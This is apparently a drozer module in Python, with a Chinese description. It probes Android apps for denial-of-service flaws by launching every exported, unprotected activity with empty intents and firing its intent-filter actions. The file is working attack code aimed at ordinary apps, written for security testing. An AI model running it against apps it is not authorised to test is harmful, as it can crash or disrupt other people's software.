# !/usr/bin/python
# -*- coding: utf-8 -*-

'''
       
        本插件是基于drozer检测工具开发
        本插件是用于检测安卓四大组件组件中的Activity组件是否存在拒绝服务的漏洞
        本插件的检测方法存在两种，一种是直接调用对外开放的Activity组件，看是否存在拒绝服务
        另一种方法是通过隐式调用Activity组件来检测是否存在拒绝服务的漏洞
'''

from pydiesel.reflection import ReflectionException
from drozer import android
from drozer.modules import common, Module

class activity(Module, common.Filters, common.IntentFilter, common.PackageManager):
	"""docstring for ClassName"""
	name = "Gets information about exported activities then Start them"
	description = "Gets information about exported activities"
	example = """no"""
	author = "JadeDragon"
	date = "2015-12-06"
	license = "BSD (3 clause)"
	path = ["drozer","attack"]
	permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]

	def add_arguments(self, parser):
		parser.add_argument("-a", "--package", default = None, help = "specify the package to inspect");

	def execute(self, arguments):
		if  arguments.package == None:
			for package in self.packageManager().getPackages(common.PackageManager.GET_ACTIVITIES):
				self.attack(arguments, package)
		else:
			package = self.packageManager().getPackageInfo(arguments.package, common.PackageManager.GET_ACTIVITIES)

			self.attack(arguments, package)

	def attack(self, arguments, package):
		exported_activities = self.match_filter(package.activities, 'exported', True)
		exported_activities = self.match_filter(exported_activities, 'permission', "null")
		attack_component_packageName = ''
		attack_activities = []
		attack_actions = []

		if len(exported_activities) > 0:
			attack_component_packageName = package.packageName
			attack_activities = exported_activities
			for activity in attack_activities:
				intent_filters = self.find_intent_filters(activity, 'activity')
				if len(intent_filters) > 0:
					for intent_filter in intent_filters:
						if len(intent_filter.actions) > 0:
							for action in intent_filter.actions:
								if action != "android.intent.action.MAIN" and action != "":
									attack_actions.append(action)
		else :
			self.stdout.write("no exported activity\n")
			return

		i = 1
		if len(attack_activities) > 0:
			self.stdout.write("[color yellow]==================== empty action test ====================[/color]\n")
			for attack_activity in attack_activities:
				try:
					self.stdout.write("     [color green][%d]: activity = %s[/color]\n" % (i, attack_activity.name))
					comp = (attack_component_packageName, attack_activity.name)
					intent = self.new("android.content.Intent")
					com = self.new("android.content.ComponentName", *comp)
					intent.setComponent(com)
					intent.setFlags(0x10000000)
					self.getContext().startActivity(intent)
				except Exception:
					self.stdout.write("             [color blue]activity %s start need permission....[/color]\n" % attack_activity.name)
				i = i + 1
		if len(attack_actions) > 0:
			self.stdout.write("[color yellow]===============================empty activity test====================[/color]\n")
			for attack_action in attack_actions:
				try:
					self.stdout.write("     [color green][%d] : action = %s [/color]\n" % (i, attack_action))
					intent = self.new("android.content.Intent")
					intent.setAction(attack_action)
					intent.setFlags(0x10000000)
					self.getContext().startActivity(intent)
				except Exception:
					self.stdout.write("             [color blue]action %s start failure....[/color]\n" % attack_action)
				i = i + 1
